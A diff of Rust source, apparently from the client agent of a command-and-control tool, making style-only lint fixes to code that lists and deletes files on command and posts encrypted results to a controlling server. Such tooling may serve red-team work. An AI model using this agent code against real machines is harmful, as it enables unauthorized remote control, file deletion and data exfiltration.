@@ -37,9 +37,9 @@ pub async fn execute_command(
     }
 
     // Try to parse as FileOperationCommand first
-    if cmd.args.len() >= 1 {
+    if !cmd.args.is_empty() {
         if let Ok(file_op_cmd) =
-            serde_json::from_slice::<FileOperationCommand>(&cmd.args[0].as_bytes())
+            serde_json::from_slice::<FileOperationCommand>(cmd.args[0].as_bytes())
         {
             match file_op_cmd {
                 FileOperationCommand::ListDir(req) => {
@@ -47,7 +47,7 @@ pub async fn execute_command(
                     let result =
                         ClientFileManager::list_directory(&PathBuf::from(&req.path), req.recursive)
                             .await;
-                    info!("Directory listing result: {:?}", result);
+                    info!("Directory listing result: {result:?}");
 
                     let response = match result {
                         Ok(entries) => {
@@ -63,7 +63,7 @@ pub async fn execute_command(
                             ListDirResponse {
                                 entries: Vec::new(),
                                 success: false,
-                                message: format!("Failed to list directory: {}", e),
+                                message: format!("Failed to list directory: {e}"),
                             }
                         }
                     };
@@ -89,7 +89,7 @@ pub async fn execute_command(
                         },
                         Err(e) => DeletePathResponse {
                             success: false,
-                            message: format!("Failed to delete path: {}", e),
+                            message: format!("Failed to delete path: {e}"),
                         },
                     };
                     send_file_operation_response(
@@ -211,7 +211,7 @@ pub async fn execute_command(
     match cmd.command.as_str() {
         "ListDir" => {
             // Keep this for backward compatibility only
-            let req: ListDirRequest = serde_json::from_slice(&cmd.args[0].as_bytes())?;
+            let req: ListDirRequest = serde_json::from_slice(cmd.args[0].as_bytes())?;
             info!("Listing directory: {}", req.path);
             let result =
                 ClientFileManager::list_directory(&PathBuf::from(&req.path), req.recursive).await;
@@ -230,7 +230,7 @@ pub async fn execute_command(
                     ListDirResponse {
                         entries: Vec::new(),
                         success: false,
-                        message: format!("Failed to list directory: {}", e),
+                        message: format!("Failed to list directory: {e}"),
                     }
                 }
             };
@@ -290,7 +290,7 @@ async fn send_command_result(
 
     let encrypted_data = cipher
         .encrypt(sensitive_data.to_string().as_bytes())
-        .map_err(|e| C2Error::Other(format!("Encryption failed: {}", e)))?;
+        .map_err(|e| C2Error::Other(format!("Encryption failed: {e}")))?;
 
     // Create encrypted response
     let encrypted_response = EncryptedCommandResponse {
@@ -328,8 +328,7 @@ async fn send_file_operation_response(
 
     let response = http_client
         .post(format!(
-            "{server_url}/api/file_operation_response/{}",
-            client_id
+            "{server_url}/api/file_operation_response/{client_id}"
         ))
         .json(&message)
         .send()
@@ -347,8 +346,7 @@ async fn send_file_operation_response(
     }
 
     info!(
-        "Successfully sent file operation response for client {}",
-        client_id
+        "Successfully sent file operation response for client {client_id}"
     );
     Ok(())
 }
